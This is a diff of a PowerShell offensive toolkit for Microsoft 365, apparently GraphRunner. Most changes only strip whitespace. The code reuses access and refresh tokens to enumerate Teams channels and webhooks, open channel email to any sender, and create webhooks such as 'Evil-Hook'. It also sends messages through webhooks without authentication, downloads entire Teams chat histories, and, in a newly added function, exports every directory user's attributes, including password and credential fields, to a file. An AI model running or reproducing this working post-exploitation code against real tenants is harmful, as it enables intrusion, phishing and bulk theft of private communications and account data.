                         Write-Host "Team Name: $teamName"
                         Write-Host "Channel Name: $($channelName)"
                         $channelFound = $true
-                        break 
+                        break
                     }
                 }
                 if ($channelFound) {
-                    break 
+                    break
                 } elseif (-not $Teams) {
                     continue
                 } else {
@@ -1907,8 +1907,8 @@ function Get-ChannelEmail{
                 }
                 ### Set the cookie Value you needs to be the team Channel ID
                 $Cookie = New-Object System.Net.Cookie
-                $Cookie.Name = "SkypeSpacesTeamId" 
-                $Cookie.Value = "$channelId" 
+                $Cookie.Name = "SkypeSpacesTeamId"
+                $Cookie.Value = "$channelId"
                 $Cookie.Domain = "outlook.office.com"
                 $WebSession.Cookies.Add($Cookie)
 
@@ -1924,7 +1924,7 @@ function Get-ChannelEmail{
                 $response6 = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/authsvc/v1.0/authz" -Method POST -headers $headers3
                 $jsonResponse = $response6.Content | ConvertFrom-Json
                 $skypeToken = $jsonResponse.Tokens.skypeToken
-                [string]$permissions = "" 
+                [string]$permissions = ""
 
             try {
                 Write-Host "Checking Channel for Email Address"
@@ -1976,7 +1976,7 @@ function Get-ChannelEmail{
                         "X-Skypetoken"  = "$skypeToken"
                     }
                     $body = "{`"allowedSenderType`":`"anyone`",`"allowedDomains`":null}"
-                    $EmailChannel = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/mt/amer/beta/channels/$channelId/email" -Method PUT -headers $SetChannelheader -Body $body 
+                    $EmailChannel = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/mt/amer/beta/channels/$channelId/email" -Method PUT -headers $SetChannelheader -Body $body
                     $EmailChannel = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/mt/amer/beta/channels/$channelId/email" -Method GET -headers $Channelheader
                     $jsonResponse = $EmailChannel.Content | ConvertFrom-Json
                     Write-Host "Updated Channel Settings"
@@ -1993,18 +1993,18 @@ function Find-ChannelEmails{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-        This module enumerates all accessible teams and the channels looking for any email addresses assoicated with them. 
+
+        This module enumerates all accessible teams and the channels looking for any email addresses assoicated with them.
 
     .PARAMETER Tokens
 
         Pass the $tokens global variable after authenticating to this parameter
 
     .EXAMPLE
-        
-        C:\PS> Find-ChannelEmails -Tokens $tokens 
+
+        C:\PS> Find-ChannelEmails -Tokens $tokens
         -----------
-        This module  enumerates all accessible teams and the channels looking for any email addresses assoicated with them. 
+        This module  enumerates all accessible teams and the channels looking for any email addresses assoicated with them.
     #>
     Param (
         [Parameter(Position = 0, Mandatory = $False)]
@@ -2013,14 +2013,14 @@ function Find-ChannelEmails{
         )
         if(!$Tokens){
             if ($global:tokens){
-                $tokens = $global:tokens   
+                $tokens = $global:tokens
             } else {
                 # Login
-                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+                Write-Host -ForegroundColor yellow "[*] First, you need to login."
                 Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                 while($auth -notlike "Yes"){
                     Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                    $answer = Read-Host 
+                    $answer = Read-Host
                     $answer = $answer.ToLower()
                     if ($answer -eq "yes" -or $answer -eq "y") {
                         Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -2034,15 +2034,15 @@ function Find-ChannelEmails{
                     }
                 }
             }
-        }    
+        }
         $accesstoken = $tokens.access_token
         $channelString = $Channel
-        [string]$refreshtoken = $tokens.refresh_token 
+        [string]$refreshtoken = $tokens.refresh_token
 
         $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
         $grantType = "refresh_token"
 
-        $access_token = $tokens.access_token   
+        $access_token = $tokens.access_token
         $teamsheaders = @{
             Authorization  = "Bearer $access_token"
             "Content-Type" = "application/json"
@@ -2073,26 +2073,26 @@ function Find-ChannelEmails{
 function Get-Webhooks{
     <#
     .SYNOPSIS
-        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url. 
+        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url.
         Author: Matt Eidelberg (@Tyl0us)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url. 
+
+        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url.
 
 
     .PARAMETER Tokens
 
         Pass the $tokens global variable after authenticating to this parameter
-  
+
     .EXAMPLE
-        
+
         C:\PS> Get-Webhooks -Tokens $tokens
         -----------
-        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url. 
+        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url.
 
     #>
     Param (
@@ -2102,14 +2102,14 @@ function Get-Webhooks{
         )
         if(!$Tokens){
             if ($global:tokens){
-                $tokens = $global:tokens   
+                $tokens = $global:tokens
             } else {
                 # Login
-                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+                Write-Host -ForegroundColor yellow "[*] First, you need to login."
                 Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                 while($auth -notlike "Yes"){
                     Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                    $answer = Read-Host 
+                    $answer = Read-Host
                     $answer = $answer.ToLower()
                     if ($answer -eq "yes" -or $answer -eq "y") {
                         Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -2124,12 +2124,12 @@ function Get-Webhooks{
                 }
             }
         }
-            $accesstoken = $tokens.access_token   
-            [string]$refreshtoken = $tokens.refresh_token 
-            
+            $accesstoken = $tokens.access_token
+            [string]$refreshtoken = $tokens.refresh_token
+
             $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
             $grantType = "refresh_token"
-            
+
             $body = @{
                 client_id           = $clientId
                 scope               = $scope
@@ -2140,10 +2140,10 @@ function Get-Webhooks{
             }
             $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body
             $token2 = $response.access_token
-            
+
             $scope2 = "https://api.spaces.skype.com/.default openid profile offline_access"
             $grantType = "refresh_token"
-            
+
             $body = @{
                 client_id           = $clientId
                 scope               = $scope2
@@ -2154,7 +2154,7 @@ function Get-Webhooks{
             }
             $response2 = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body
             $SStoken = $response2.access_token
-            
+
             ### Since we are looping through every channel we need to purge these values each time
             if ($WebSession) {
                 Write-Host "WebSessions exists clearing old data"
@@ -2166,7 +2166,7 @@ function Get-Webhooks{
             }
             else {
             }
-            
+
             $headers = @{
                 "Host"             = "outlook.office.com"
                 "Cache-Control"    = "no-cache"
@@ -2176,18 +2176,18 @@ function Get-Webhooks{
                 "Sstoken"          = "$SStoken"
                 "User-Agent"       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
             }
-            
+
             $response3 = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/Manage/AuthorizeUsingToken?client=SkypeSpaces" -Method Get -SessionVariable WebSession -headers $headers
             $url = 'https://outlook.office.com'
             $WebSession.Headers.Clear()
-            
-            $access_token = $tokens.access_token   
+
+            $access_token = $tokens.access_token
             $teamsheaders = @{
                 Authorization  = "Bearer $access_token"
                 "Content-Type" = "application/json"
             }
             $teamsResponse = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $teamsheaders
-            
+
             foreach ($team in $teamsResponse.value) {
                 $teamId = $team.id
                 Write-Host "Team: $($team.displayName)"
@@ -2197,60 +2197,60 @@ function Get-Webhooks{
                     $channelId = $channel.id
                     Write-Host "  Checking Channel: $($channel.displayName)"
                     $channelName = $channel.displayName
-                   
+
                     $headers2 = @{
                         "Host"       = "outlook.office.com"
                         "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                     }
-            
+
                     ### Set the cookie Value you needs to be the team Channel ID
                     $Cookie = New-Object System.Net.Cookie
                     $Cookie.Name = "SkypeSpacesTeamId"
                     $Cookie.Value = "$channelId"
                     $Cookie.Domain = "outlook.office.com"
                     $WebSession.Cookies.Add($Cookie)
-            
+
                     $token3 = $response2.access_token
-            
-            
+
+
                     ### This is where we get a SPECIFIC SkypeSpaceToken that allows us Query the configuration API
                     $headers3 = @{
                         "Authorization" = "Bearer $token3"
                         "User-Agent"    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                         "Origin"        = "https://teams.microsoft.com"
-            
+
                     }
                     $response6 = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/authsvc/v1.0/authz" -Method POST  -headers $headers3
                     $jsonResponse = $response6.Content | ConvertFrom-Json
                     $skypeToken = $jsonResponse.Tokens.skypeToken
-            
-            
+
+
                     ### Create a temp copy of the websessions then replace the SkypeSpaceToken for the ConfigurationManager API
                     $tempSessions = $WebSession
-            
-                    $cookieName = "SkypeSpacesToken" 
-                    $newValue = "$skypeToken" 
+
+                    $cookieName = "SkypeSpacesToken"
+                    $newValue = "$skypeToken"
                     $SuperAwesomeSession = New-Object System.Net.CookieContainer
                     foreach ($cookie in $websession.Cookies.GetCookies($url)) {
                         if ($cookie.Name -ne "SkypeSpacesToken") {
                             $SuperAwesomeSession.Add($cookie)
                         }
                     }
-            
+
                     $webSession.Cookies = $SuperAwesomeSession
                     $Cookie1 = New-Object System.Net.Cookie
-                    $Cookie1.Name = "SkypeSpacesToken" 
+                    $Cookie1.Name = "SkypeSpacesToken"
                     $Cookie1.Value = "$skypeToken"
                     $Cookie1.Domain = "outlook.office.com"
                     $tempSessions.Cookies.Add($Cookie1)
-            
-            
+
+
                     $headers4 = @{
                         "Host"       = "outlook.office.com"
                         "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                     }
 
-                    ### Need to get the MailBox ID client  
+                    ### Need to get the MailBox ID client
                     try {
                         $GetConnectorsConfiginfo = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/Manage/Configurations?MailboxAddress=$teamId%40$tenantid&client=SkypeSpaces&SSThread=$channelId&HostName=teams.microsoft.com&culture=en-us&SSEnv=DM2P&ssChannelName=$channelName&ssApiHost=amer.ng.msg.teams.microsoft.com&iframe=true&SSTheme=default&SSTokenType=SkypeToken&SSFormat=Swift&isDesktopClient=false&enableConnectorApps=tru" -Method Get -WebSession $tempSessions -headers $headers4 -ErrorAction Stop
                     } catch {
@@ -2270,20 +2270,20 @@ function Get-Webhooks{
 
                     ### Create an array to store ConnectorConfigurationIds
                     $connectorConfigurationIds = @()
-            
+
                     ### Loop through each ProviderGuid
                     foreach ($guid in $jsonContent.PSObject.Properties.Name) {
                         $providerInfo = $jsonContent.$guid
-            
+
                         ### Loop through each ConfiguredConnector under this ProviderGuid
                         foreach ($connector in $providerInfo.ConfiguredConnectors) {
                             ### Add the ConnectorConfigurationId to the array
                             $connectorConfigurationIds = $connector.ConnectorConfigurationId
-                  
+
                             ### Now we can loop through each ConnectorConfigurationId
                             foreach ($configId in $connectorConfigurationIds) {
                                 $WebhookinfoResponse = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/IncomingWebhook/Manage/Show?MailboxAddress=$teamId%40$tenantid&client=SkypeSpaces&SSThread=$channelId&HostName=teams.microsoft.com&culture=en-us&ssApiHost=amer.ng.msg.teams.microsoft.com&iframe=true&profileuniquename=$configId" -Method Get -WebSession $WebSession
-            
+
                                 $pattern = '<button[^>]+onclick="CopyToClipboard\(''webhookUrl'', ''(https://[^'']+)'','
                                 $matches = [regex]::Matches($WebhookinfoResponse.Content, $pattern)
                                 $webhookurls = $matches | ForEach-Object { $_.Groups[1].Value }
@@ -2300,7 +2300,7 @@ function Get-Webhooks{
                                     Write-Host "        Webhooks: $webhookurls"
                             }
                         }
-            
+
                     }
                 }
             }
@@ -2311,43 +2311,43 @@ function Get-Webhooks{
 function Create-Webhook{
         <#
         .SYNOPSIS
-            This module creates a webhook in a defined channel and provides the URL.   
+            This module creates a webhook in a defined channel and provides the URL.
             Author: Matt Eidelberg (@Tyl0us)
             License: MIT
             Required Dependencies: None
             Optional Dependencies: None
-    
+
         .DESCRIPTION
-            
-            This module creates a webhook in a defined channel and provides the URL. 
-    
-    
+
+            This module creates a webhook in a defined channel and provides the URL.
+
+
         .PARAMETER Tokens
-    
+
             Pass the $tokens global variable after authenticating to this parameter
-        
+
         .PARAMETER Channel
-    
+
             The channel name to create the webhook in
 
         .PARAMETER Teams
 
-            The team name that the channel resides in 
-           
+            The team name that the channel resides in
+
         .PARAMETER Name
-    
+
             The name you want to call the created webhook
 
         .PARAMETER ConnectorType
-    
+
             The the type of connector to use for the webhook (IncomingWebhook, Jira , Jenkins, AzureDevOps)
-      
+
         .EXAMPLE
-            
+
             C:\PS> Create-Webhook -Tokens $tokens -Channel "Channel Name" -Teams "Team Name" -Name "Evil-Hook" -ConnectorType IncomingWebhook
             -----------
              This module creates a webhook in a defined channel and provides the URL.
-    
+
         #>
         Param (
             [Parameter(Position = 0, Mandatory = $False)]
@@ -2368,14 +2368,14 @@ function Create-Webhook{
             )
             if(!$Tokens){
                 if ($global:tokens){
-                    $tokens = $global:tokens   
+                    $tokens = $global:tokens
                 } else {
                     # Login
-                    Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+                    Write-Host -ForegroundColor yellow "[*] First, you need to login."
                     Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                     while($auth -notlike "Yes"){
                         Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
-                        $answer = Read-Host 
+                        $answer = Read-Host
                         $answer = $answer.ToLower()
                         if ($answer -eq "yes" -or $answer -eq "y") {
                             Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
@@ -2391,8 +2391,8 @@ function Create-Webhook{
                 }
             }
 
-        $accesstoken = $tokens.access_token   
-        [string]$refreshtoken = $tokens.refresh_token 
+        $accesstoken = $tokens.access_token
+        [string]$refreshtoken = $tokens.refresh_token
         $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
         $grantType = "refresh_token"
 
@@ -2469,7 +2469,7 @@ function Create-Webhook{
         $WebSession.Headers.Clear()
 
         ### addded logic to loop through all teams, to get the teams ID and then the channels and their IDs
-        $access_token = $tokens.access_token   
+        $access_token = $tokens.access_token
         $teamsheaders = @{
             Authorization  = "Bearer $access_token"
             "Content-Type" = "application/json"
@@ -2485,11 +2485,11 @@ function Create-Webhook{
                         $channelId = $channelinfo.id
                         $channelName = $channelinfo.displayName
                         $channelFound = $true
-                        break 
+                        break
                     }
                 }
                 if ($channelFound) {
-                    break 
+                    break
                 } elseif (-not $Teams) {
                     continue
                 } else {
@@ -2519,7 +2519,7 @@ function Create-Webhook{
                         ### Set the cookie Value you needs to be the team Channel ID
                         $Cookie = New-Object System.Net.Cookie
                         $Cookie.Name = "SkypeSpacesTeamId"
-                        $Cookie.Value = "$channelId" 
+                        $Cookie.Value = "$channelId"
                         $Cookie.Domain = "outlook.office.com"
                         $WebSession.Cookies.Add($Cookie)
 
@@ -2539,8 +2539,8 @@ function Create-Webhook{
                         ### Create a temp copy of the websessions then replace the SkypeSpaceToken for the ConfigurationManager API
                         $tempSessions = $WebSession
 
-                        $cookieName = "SkypeSpacesToken" 
-                        $newValue = "$skypeToken" 
+                        $cookieName = "SkypeSpacesToken"
+                        $newValue = "$skypeToken"
                         $SuperAwesomeSession = New-Object System.Net.CookieContainer
                         foreach ($cookie in $websession.Cookies.GetCookies($url)) {
                             if ($cookie.Name -ne "SkypeSpacesToken") {
@@ -2550,7 +2550,7 @@ function Create-Webhook{
 
                         $webSession.Cookies = $SuperAwesomeSession
                         $Cookie1 = New-Object System.Net.Cookie
-                        $Cookie1.Name = "SkypeSpacesToken" 
+                        $Cookie1.Name = "SkypeSpacesToken"
                         $Cookie1.Value = "$skypeToken"
                         $Cookie1.Domain = "outlook.office.com"
                         $tempSessions.Cookies.Add($Cookie1)
@@ -2561,7 +2561,7 @@ function Create-Webhook{
                             "Host"       = "outlook.office.com"
                             "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                         }
-                        $WHresponse = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/$connectorurl/Manage/New?MailboxAddress=$teamId%40$tenantid&client=SkypeSpaces&SSThread=$channelId&HostName=teams.microsoft.com&culture=en-us&ssApiHost=amer.ng.msg.teams.microsoft.com&iframe=true&SSTheme=default" -Method Get -WebSession $WebSession -headers $headers4 
+                        $WHresponse = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/$connectorurl/Manage/New?MailboxAddress=$teamId%40$tenantid&client=SkypeSpaces&SSThread=$channelId&HostName=teams.microsoft.com&culture=en-us&ssApiHost=amer.ng.msg.teams.microsoft.com&iframe=true&SSTheme=default" -Method Get -WebSession $WebSession -headers $headers4
                         $pattern = '<input\s+name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"'
                         $matches = [regex]::Matches($WHresponse.Content, $pattern)
 
@@ -2582,7 +2582,7 @@ function Create-Webhook{
                         else {
                             Write-Host "Alt value not found."
                         }
-                        
+
                         $ForwardToEmailpattern = 'id="ForwardToEmail" name="ForwardToEmail" type="hidden" value="([^"]+)"'
                         $ForwardToEmailmatches = [regex]::Matches($WHresponse.Content, $ForwardToEmailpattern)
 
@@ -2601,8 +2601,8 @@ function Create-Webhook{
 
                         $tempSessions = $WebSession
 
-                        $cookieName = "SkypeSpacesToken" 
-                        $newValue = "$skypeToken" 
+                        $cookieName = "SkypeSpacesToken"
+                        $newValue = "$skypeToken"
                         $SuperAwesomeSession = New-Object System.Net.CookieContainer
                         foreach ($cookie in $websession.Cookies.GetCookies($url)) {
                             if ($cookie.Name -ne "SkypeSpacesToken") {
@@ -2612,7 +2612,7 @@ function Create-Webhook{
 
                         $webSession.Cookies = $SuperAwesomeSession
                         $Cookie1 = New-Object System.Net.Cookie
-                        $Cookie1.Name = "SkypeSpacesToken" 
+                        $Cookie1.Name = "SkypeSpacesToken"
                         $Cookie1.Value = "$skypeToken"
                         $Cookie1.Domain = "outlook.office.com"
                         $tempSessions.Cookies.Add($Cookie1)
@@ -2621,21 +2621,21 @@ function Create-Webhook{
                         $WebSession.Headers.Clear()
                         Remove-Variable -Name tempSessions
                         Remove-Variable -Name SuperAwesomeSession
-        
+
                         $tempSessions = $WebSession
-        
-                        $cookieName = "SkypeSpacesTeamId" 
-                        $newValue = "$GeneralchannelId" 
+
+                        $cookieName = "SkypeSpacesTeamId"
+                        $newValue = "$GeneralchannelId"
                         $SuperAwesomeSession = New-Object System.Net.CookieContainer
                         foreach ($cookie in $websession.Cookies.GetCookies($url)) {
                             if ($cookie.Name -ne "SkypeSpacesTeamId") {
                                 $SuperAwesomeSession.Add($cookie)
                             }
                         }
-        
+
                         $webSession.Cookies = $SuperAwesomeSession
                         $Cookie1 = New-Object System.Net.Cookie
-                        $Cookie1.Name = "SkypeSpacesTeamId" 
+                        $Cookie1.Name = "SkypeSpacesTeamId"
                         $Cookie1.Value = "$GeneralchannelId"
                         $Cookie1.Domain = "outlook.office.com"
                         $tempSessions.Cookies.Add($Cookie1)
@@ -2646,7 +2646,7 @@ function Create-Webhook{
                         $randomString = -join ((1..$length) | ForEach-Object { Get-Random -InputObject $characters.ToCharArray() })
                         #Write-Output $randomString
 
-                    
+
                         $Creationheaders = @{
                             "Host"       = "outlook.office.com"
                             "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
@@ -2654,13 +2654,13 @@ function Create-Webhook{
                         $LF = "`r`n";
                         $boundary = "----WebKitFormBoundary$randomString"
 
-                        $bodyLines = ( 
+                        $bodyLines = (
                             "--$boundary",
                             "Content-Disposition: form-data; name=`"__RequestVerificationToken`"$LF",
                             "$tokenValue",
                             "--$boundary",
                             "Content-Disposition: form-data; name=`"ConnectorConfigurationId`"",
-                            "$LF",    
+                            "$LF",
                             "--$boundary",
                             "Content-Disposition: form-data; name=`"AlternateId`"$LF",
                             "$AltIDvalue",
@@ -2701,9 +2701,9 @@ function Create-Webhook{
                             "--$boundary",
                             "Content-Disposition: form-data; name=`"customImage`"; filename=`"`"",
                             "Content-Type: application/octet-stream$LF$LF",
-                            "--$boundary--$LF" 
+                            "--$boundary--$LF"
                         ) -join $LF
-        
+
 
                         $webhookcreation = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/$connectorurl/Manage/Create?Client=SkypeSpaces&MailboxAddress=$teamId%40$tenantid&Culture=en-us&HostName=teams.microsoft.com&iFrame=true&SSApiHost=amer.ng.msg.teams.microsoft.com&SSThread=$channelId&SSTheme=default&enableConnectorApps=true&isDesktopClient=false" -Method POST -headers $Creationheaders -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines -WebSession $WebSession
                         if ($ConnectorType -eq "IncomingWebhook"){
@@ -2724,22 +2724,22 @@ function Create-Webhook{
                             Write-Host "Error Webhook Address Not Found."
                         }
              break
-        }     
+        }
     }
 }
 
 function Send-TeamsMessage{
     <#
     .SYNOPSIS
-        This module sends a message using Microsoft Team's webhooks, without needing any authentication. 
+        This module sends a message using Microsoft Team's webhooks, without needing any authentication.
         Author: Matt Eidelberg (@Tyl0us)
         License: MIT
         Required Dependencies: None
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-        This module sends a message using Microsoft Team's webhooks, without needing any authentication. 
+
+        This module sends a message using Microsoft Team's webhooks, without needing any authentication.
 
 
     .PARAMETER webhookUrl
@@ -2749,9 +2749,9 @@ function Send-TeamsMessage{
     .PARAMETER MessagecardFilePath
 
         The full path to the message template file you want to send.
-  
+
     .EXAMPLE
-        
+
         C:\PS> Send-TeamsMessage -webhookUrl $url -MessagecardFilePath .\message.txt
         -----------
         This module sends a message using Microsoft Team's webhooks, without needing any authentication.
@@ -2765,7 +2765,7 @@ function Send-TeamsMessage{
         [string]
         $MessagecardFilePath = ""
         )
-       
+
         # Read the contents of the file into the $Messagecard variable
         $Messagecard = Get-Content -Path $MessagecardFilePath | Out-String
 
@@ -2788,16 +2788,16 @@ function Get-TeamsChat{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
+
        This module downloads full Teams chat conversations. It will prompt to either download all conversations for a particular user or if you want to download individual conversations using a chat ID. This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite.
-        
+
     .PARAMETER Tokens
 
         Pass the $tokens global variable after authenticating to this parameter
-  
+
     .EXAMPLE
-        
-        C:\PS> Get-TeamsChat -Tokens $tokens 
+
+        C:\PS> Get-TeamsChat -Tokens $tokens
         -----------
         This will list out all of the Teams chat conversations for the user and provide an option to download all conversations or just individual chats.
 
@@ -2809,16 +2809,16 @@ function Get-TeamsChat{
     $Tokens = ""
     )
     if($Tokens){
-            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."   
+            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
     }
     else{
         # Login
-        Write-Host -ForegroundColor yellow "[*] This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite" 
+        Write-Host -ForegroundColor yellow "[*] This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite"
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         break
     }
-    $access_token = $tokens.access_token   
-    [string]$refresh_token = $tokens.refresh_token 
+    $access_token = $tokens.access_token
+    [string]$refresh_token = $tokens.refresh_token
 
 
     # Define the headers with the access token and content type
@@ -2841,13 +2841,13 @@ function Get-TeamsChat{
     foreach($chatresult in $chatsResponse.value){
         # Format the DateTime object as a readable string
         Write-Output "Last Message Date: $($chatresult.lastMessagePreview.createdDateTime) | Members: $($chatresult.members.email -join ', ') | Message Preview: $($chatresult.lastMessagePreview.body.content) | ChatID: $($chatresult.id)"
-        Write-Host ("=" * 80) 
+        Write-Host ("=" * 80)
     }
 
     # Process each chat and retrieve its messages
     if ($chatsResponse.value.Count -gt 0) {
         Write-Host -ForegroundColor Cyan "[*] A total of $totalchats conversations were found. Do you want to download all of them? (Yes/No)"
-        $answer = Read-Host 
+        $answer = Read-Host
         $answer = $answer.ToLower()
         if ($answer -eq "yes" -or $answer -eq "y") {
             $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
@@ -2896,7 +2896,7 @@ function Get-TeamsChat{
                 if ($individualAnswer -eq "yes" -or $individualAnswer -eq "y") {
                     # Prompt the user to enter the ChatID
                     $chatIdToDownload = Read-Host "Enter the ChatID of the conversation you want to download:"
-                
+
                     # Find the chat with the specified ChatID
                     $selectedChat = $chatsResponse.value | Where-Object { $_.id -eq $chatIdToDownload }
 
@@ -2947,18 +2947,128 @@ function Get-TeamsChat{
     }
 }
 
+function Invoke-AzureADUsersAttributes {
+    <#
+    .SYNOPSIS
+    This module will get all users and user attributes.
+    .DESCRIPTION
+    This module will get all users and user attributes using Microsoft Graph.
+    .PARAMETER Tokens
+    Token object for auth
+    .PARAMETER OutFile
+    Output file path for JSON export (default: users.json)
+    .EXAMPLE
+    PS> Invoke-AzureADUsersAttributes -Tokens $tokens
+    #>
+    param(
+        [Parameter(Mandatory = $false)]
+        [object[]] $Tokens = "",
+
+        [Parameter(Mandatory = $false)]
+        [string] $OutFile = "users.json"
+    )
+
+    if ($Tokens) {
+        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
+    } else {
+        Write-Host -ForegroundColor yellow "[*] First, you need to login."
+        while ($auth -ne "Yes") {
+            Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
+            $answer = Read-Host
+            if ($answer -match '^(yes|y)$') {
+                Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
+                $Tokens = Get-GraphTokens -ExternalCall
+                $auth = "Yes"
+            } elseif ($answer -match '^(no|n)$') {
+                Write-Host -ForegroundColor Yellow "[*] Quitting..."
+                return
+            } else {
+                Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
+            }
+        }
+    }
+
+    $accessToken = $Tokens.access_token
+    $headers = @{ Authorization = "Bearer $accessToken" }
+
+    $usersEndpoint = "https://graph.microsoft.com/v1.0/users"
+    $graphApiUrl = "https://graph.microsoft.com/v1.0"
+    $allUsers = @()
+
+    Write-Host "[*] Gathering the users from the tenant..."
+
+    $attributes = '?$select=accountEnabled,ageGroup,assignedLicenses,businessPhones,city,companyName,consentProvidedForMinor,country,createdDateTime,creationType,department,displayName,mail,employeeId,employeeHireDate,employeeOrgData,employeeType,onPremisesExtensionAttributes,externalUserStateChangeDateTime,faxNumber,givenName,imAddresses,identities,externalUserState,jobTitle,surname,lastPasswordChangeDateTime,legalAgeGroupClassification,mailNickname,mobilePhone,id,officeLocation,onPremisesSamAccountName,onPremisesDistinguishedName,onPremisesDomainName,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesProvisioningErrors,onPremisesSecurityIdentifier,onPremisesSyncEnabled,onPremisesUserPrincipalName,otherMails,passwordPolicies,passwordProfile,preferredDataLocation,preferredLanguage,proxyAddresses,Comment,Info,Password,Information,Description,login,signin,credential,cred,credentials,data,signInSessionsValidFromDateTime,sponsors,state,streetAddress,usageLocation,userPrincipalName,userType,postalCode&$expand=manager'
+
+    do {
+        try {
+            $usersResponse = Invoke-RestMethod -Uri $usersEndpoint -Headers $headers
+        } catch {
+            if ($_.Exception.Response.StatusCode.value__ -eq 429) {
+                Write-Host -ForegroundColor red "[!] Throttled... sleeping 5 seconds"
+                Start-Sleep -Seconds 5
+                continue
+            } else {
+                throw $_
+            }
+        }
+
+        foreach ($user in $usersResponse.value) {
+            $userId = $user.id
+            $uri = "$graphApiUrl/users/$userId$attributes"
+
+            try {
+                $userAttributesResponse = Invoke-RestMethod -Uri $uri -Headers $headers
+            } catch {
+                if ($_.Exception.Response.StatusCode.value__ -eq 429) {
+                    Write-Host -ForegroundColor red "[!] Throttled on detail fetch... sleeping 5 seconds"
+                    Start-Sleep -Seconds 5
+                    continue
+                } else {
+                    throw $_
+                }
+            }
+
+            $userObj = @{}
+
+            $userAttributesResponse.PSObject.Properties | Where-Object { $_.Name -ne "@odata.context" } | ForEach-Object {
+                $name = $_.Name
+                $value = $_.Value
+
+                if ($value -is [System.Collections.IEnumerable] -and !$value.GetType().IsPrimitive -and $value -ne $null -and $value -notlike '*String*') {
+                    $userObj[$name] = $value | ConvertTo-Json -Depth 4 -Compress
+                } else {
+                    $userObj[$name] = $value
+                }
+            }
+
+            $allUsers += [PSCustomObject]$userObj
+        }
+
+        if ($usersResponse.'@odata.nextLink') {
+            Write-Host "[*] Gathering more users..."
+            $usersEndpoint = $usersResponse.'@odata.nextLink'
+        } else {
+            break
+        }
+    } while ($true)
+
+    Write-Host "[*] Exporting $($allUsers.Count) users to $OutFile..."
+    $allUsers | ConvertTo-Json -Depth 5 | Out-File -Encoding utf8 $OutFile
+    Write-Host "[*] Done."
+}
+
 Function Get-AzureADUsers{
     <#
     .SYNOPSIS
 
-        Gather the full list of users from the directory.        
+        Gather the full list of users from the directory.
         Author: Beau Bullock (@dafthack)
